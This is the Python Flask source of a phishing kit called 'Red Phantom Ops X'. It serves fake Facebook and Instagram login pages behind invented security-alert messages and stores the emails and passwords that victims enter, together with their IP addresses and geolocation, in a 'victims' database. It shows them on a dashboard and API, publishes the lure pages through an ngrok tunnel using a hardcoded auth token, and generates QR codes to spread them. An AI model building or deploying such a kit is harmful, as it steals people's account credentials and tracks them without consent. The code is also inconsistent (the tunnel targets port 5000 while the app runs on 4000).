from flask import Flask, request, render_template, jsonify, redirect, url_for
import sqlite3
import datetime
import requests
import threading
import qrcode
from io import BytesIO
import base64
import random
import sys

app = Flask(__name__)

class Config:
    SECRET_KEY = 'your-secret-key-here'
    DATABASE = 'phishing_data.db'
    NGROK_AUTH_TOKEN = "367uQ3mYTbydt0UvGXdjyqGOaHB_j4pDmRBmmKxFqtJ6PfNL"
    SECURITY_MESSAGES = [
        "Unusual login from your area. Verify your identity.",
        "Security check required. Confirm it's you.",
        "Login from new device detected."
    ]

app.config.from_object(Config())

def get_db_connection():
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT,
        user_agent TEXT,
        timestamp TEXT,
        country TEXT,
        city TEXT,
        isp TEXT,
        credentials TEXT,
        platform TEXT,
        referer TEXT
    )''')
    conn.commit()
    conn.close()

class GeoService:
    @staticmethod
    def get_geo_info(ip):
        if ip in ['127.0.0.1', 'localhost'] or ip.startswith(('192.168.', '10.', '172.')):
            return {'country': 'Local', 'city': 'Local', 'isp': 'LAN'}
        
        try:
            response = requests.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
                timeout=5
            )
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown')
                    }
        except Exception as e:
            print(f"Error getting geo info: {e}")
        
        return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}

class QRGenerator:
    @staticmethod
    def generate_qr_base64(url):
        try:
            import qrcode
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=6,
                border=2,
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            img = qr.make_image(fill_color="black", back_color="white")
            buf = BytesIO()
            img.save(buf)
            buf.seek(0)
            return base64.b64encode(buf.read()).decode()
        except Exception as e:
            print(f"Error generating QR code: {e}")
            return QRGenerator.generate_simple_qr(url)
    
    @staticmethod
    def generate_simple_qr(url):
        """إنشاء QR code بسيط بدون Pillow (للاستخدام في حالة الطوارئ)"""
        empty_image = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
        return empty_image

class VictimLogger:
    def __init__(self):
        self.geo_service = GeoService()
    
    def get_client_info(self):
        """استخراج معلومات العميل من الطلب"""
        forwarded = request.headers.get('X-Forwarded-For')
        ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
        
        return {
            'ip': ip,
            'user_agent': request.headers.get('User-Agent', 'Unknown'),
            'referer': request.headers.get('Referer', 'Direct'),
            'timestamp': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'geo': self.geo_service.get_geo_info(ip)
        }
    
    def log_visit(self, platform, credentials='Page visited'):
        """تسجيل زيارة الضحية أو بيانات الاعتماد"""
        client_info = self.get_client_info()
        
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('''INSERT INTO victims (
            ip, user_agent, timestamp, country, city, isp, credentials, platform, referer
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (
            client_info['ip'],
            client_info['user_agent'],
            client_info['timestamp'],
            client_info['geo']['country'],
            client_info['geo']['city'],
            client_info['geo']['isp'],
            credentials,
            platform,
            client_info['referer']
        ))
        conn.commit()
        conn.close()
        
        if credentials != 'Page visited':
            print("\n" + "="*60)
            print(f"🎯 {platform.upper()} VICTIM!")
            print(f"   IP: {client_info['ip']}")
            print(f"   Location: {client_info['geo']['city']}, {client_info['geo']['country']}")
            print(f"   ISP: {client_info['geo']['isp']}")
            print(f"   Time: {client_info['timestamp']}")
            print(f"   🔑 {credentials}")
            print("="*60)
        else:
            print(f"\n👁️ {platform.upper()} visit: {client_info['ip']} | "
                f"{client_info['geo']['city']}, {client_info['geo']['country']}")
    
    def get_all_victims(self):
        """الحصول على جميع الضحايا من قاعدة البيانات"""
        conn = get_db_connection()
        c = conn.cursor()
        c.execute('SELECT * FROM victims ORDER BY id DESC')
        rows = c.fetchall()
        conn.close()
        return rows

@app.route('/')
def index():
    return redirect(url_for('facebook'))

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    logger = VictimLogger()
    
    if request.method == 'POST':
        email = request.form.get('email', '').strip()
        password = request.form.get('password', '').strip()
        credentials = f"Email: {email}, Password: {password}"
        
        logger.log_visit('facebook', credentials)
        return redirect("https://facebook.com", code=302)
    
    logger.log_visit('facebook')
    security_message = random.choice(app.config['SECURITY_MESSAGES'])
    return render_template('facebook.html', security_message=security_message)

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    logger = VictimLogger()
    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        credentials = f"Username: {username}, Password: {password}"
        
        logger.log_visit('instagram', credentials)
        return redirect("https://instagram.com", code=302)
    
    logger.log_visit('instagram')
    security_message = random.choice(app.config['SECURITY_MESSAGES'])
    return render_template('instagram.html', security_message=security_message)

@app.route('/dashboard')
def dashboard():
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT * FROM victims ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            'id': row[0],
            'ip': row[1],
            'user_agent': row[2],
            'timestamp': row[3],
            'country': row[4],
            'city': row[5],
            'isp': row[6],
            'credentials': row[7],
            'platform': row[8],
            'referer': row[9]
        })
    
    return render_template('dashboard.html', victims=victims_list)
    
@app.route('/qr')
def qr_page():
    base = getattr(app, 'public_url', 'http://localhost:5000')
    links = {
        'facebook': f'{base}/facebook',
        'instagram': f'{base}/instagram',
        'dashboard': f'{base}/dashboard'
    }
    
    qr_generator = QRGenerator()
    qr_codes = {
        'facebook': qr_generator.generate_qr_base64(links['facebook']),
        'instagram': qr_generator.generate_qr_base64(links['instagram'])
    }
    
    return render_template('qr.html', base_url=base, qr_codes=qr_codes)

def start_ngrok():
    try:
        from pyngrok import ngrok, conf
        conf.get_default().auth_token = app.config['NGROK_AUTH_TOKEN']
        
        tunnel = ngrok.connect(5000, "http", bind_tls=True)
        public_url = tunnel.public_url
        app.public_url = public_url
        
        print("\n" + "="*70)
        print("✅ RED PHANTOM ACTIVE — HTTPS via ngrok!")
        print(f"🔗 Facebook:   {public_url}/facebook")
        print(f"🔗 Instagram:  {public_url}/instagram")
        print(f"📊 Dashboard:  {public_url}/dashboard")
        print(f"📲 QR Codes:   {public_url}/qr")
        print("="*70)
        print("🎯 Send any link to your friends — works globally (no same network)!")
        return public_url
    except ImportError:
        print("❌ pyngrok not installed. Install with: pip install pyngrok")
    except Exception as e:
        print(f"❌ ngrok error: {e}")
        print("💡 Run CMD as Admin, or set token manually:")
        print("   ngrok config add-authtoken YOUR_TOKEN")
    return None

@app.route('/api/victims', methods=['GET'])
def api_victims():
    logger = VictimLogger()
    victims = logger.get_all_victims()
    
    result = []
    for victim in victims:
        result.append({
            'id': victim['id'],
            'ip': victim['ip'],
            'platform': victim['platform'],
            'location': f"{victim['city']}, {victim['country']}",
            'credentials': victim['credentials'],
            'timestamp': victim['timestamp'],
            'isp': victim['isp']
        })
    
    return jsonify(result)

@app.route('/api/stats', methods=['GET'])
def api_stats():
    conn = get_db_connection()
    c = conn.cursor()
    
    c.execute('SELECT COUNT(*) FROM victims')
    total = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM victims WHERE credentials != "Page visited"')
    with_creds = c.fetchone()[0]
    
    c.execute('SELECT platform, COUNT(*) FROM victims GROUP BY platform')
    by_platform_rows = c.fetchall()
    by_platform = {}
    for row in by_platform_rows:
        by_platform[row[0]] = row[1]
    
    c.execute('''SELECT COUNT(*) FROM victims 
                WHERE timestamp >= datetime('now', '-1 day')''')
    recent = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total_victims': total,
        'with_credentials': with_creds,
        'by_platform': by_platform,
        'recent_24h': recent
    })

if __name__ == '__main__':
    init_db()
    
    print("🚀 Starting Red Phantom Ops X...")
    
    try:
        import qrcode
        print("✅ qrcode module loaded successfully")
    except ImportError:
        print("❌ qrcode module not found. Install with: pip install qrcode")
        sys.exit(1)
    
    try:
        import pyngrok
        print("✅ pyngrok module loaded successfully")
    except ImportError:
        print("⚠️  pyngrok module not found. Ngrok features will be disabled.")
    
    try:
        ngrok_thread = threading.Thread(target=start_ngrok, daemon=True)
        ngrok_thread.start()
        import time
        time.sleep(2.5)
    except:
        print("⚠️  Could not start ngrok thread")
    
    print("🌐 Local server: http://127.0.0.1:4000")
    print("📱 Access the dashboard at: http://127.0.0.1:4000/dashboard")
    print("🔒 Remember: This is for educational purposes only!")
    
    try:
        app.run(host='127.0.0.1', port=4000, debug=False, use_reloader=False)
    except KeyboardInterrupt:
        print("\n👋 Shutting down Red Phantom Ops X...")
    except Exception as e:
        print(f"❌ Error running server: {e}")